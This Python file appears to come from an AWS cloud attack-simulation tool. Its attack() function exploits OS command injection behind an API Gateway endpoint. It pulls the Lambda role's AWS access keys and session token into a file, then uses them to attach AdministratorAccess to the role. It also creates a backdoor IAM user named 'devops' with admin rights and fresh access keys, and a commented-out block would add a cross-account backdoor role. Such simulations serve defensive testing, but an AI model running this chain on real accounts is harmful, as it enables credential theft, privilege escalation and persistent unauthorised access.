import subprocess
from termcolor import colored

from helpers.main import loading_animation, pbar_sleep


def attack(data):
    """TODO"""

    API_GW_URL = data["apigateway-rest-endpoint"]
    LAMBDA_ROLE_NAME = data["lambda-role-name"]
    API_GW_ID = data["api-gateway-id"]
    LAMBDA_FUNC_ARN = data["lambda-func-name"]

    print(colored("Exploiting the Application on API GW", color="red"))
    loading_animation()
    print("-"*30)   

    print(colored("Detected OS Injection through API GW, lambda backend, attempting credential exfil", color="red"))
    loading_animation()
    print("-"*30)   

    subprocess.call("curl '"+API_GW_URL+"?query=env' | grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN >> token.txt", shell=True)
    print(colored("Successfuly Exifiltrated Lambda Role Creds", color="red"))
    loading_animation()
    print("-"*30)   

    creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN token.txt)"
    subprocess.call(""+creds+" && aws sts get-caller-identity --no-cli-pager", shell=True)
    
    print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
    subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME+"", shell=True)
    sleep_duration = 60
    pbar_sleep(sleep_duration)
    
    #subprocess.call("curl '"+API_GW_URL+"?query=ping'", shell=True)

    #Backdoor IAM User
    print(colored("Creating a Backdoor User which can be used by the attacker", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(""+creds+" && aws iam create-user --user-name devops  --no-cli-pager", shell=True)
    subprocess.call(""+creds+" && aws iam attach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
    subprocess.call(""+creds+" && aws iam create-access-key --user-name devops  --no-cli-pager", shell=True)

    #Backdoor Role
    # print(colored("Creating a Backdoor Role which can be assumed from custom AWS account", color="red"))
    # loading_animation()
    # print("-"*30)
    # subprocess.call(""+creds+" && aws iam create-role --role-name monitoring-metrics --assume-role-policy-document file://infra/scenario-2/assume-role-trust-policy.json", shell=True)
    # subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name monitoring-metrics", shell=True)

    # gen_report_2(API_GW_ID, LAMBDA_FUNC_ARN, API_GW_URL, LAMBDA_ROLE_NAME)

    subprocess.call("rm token.txt", shell=True)
    
    # TODO: only return true if attack succeeded?
    return True
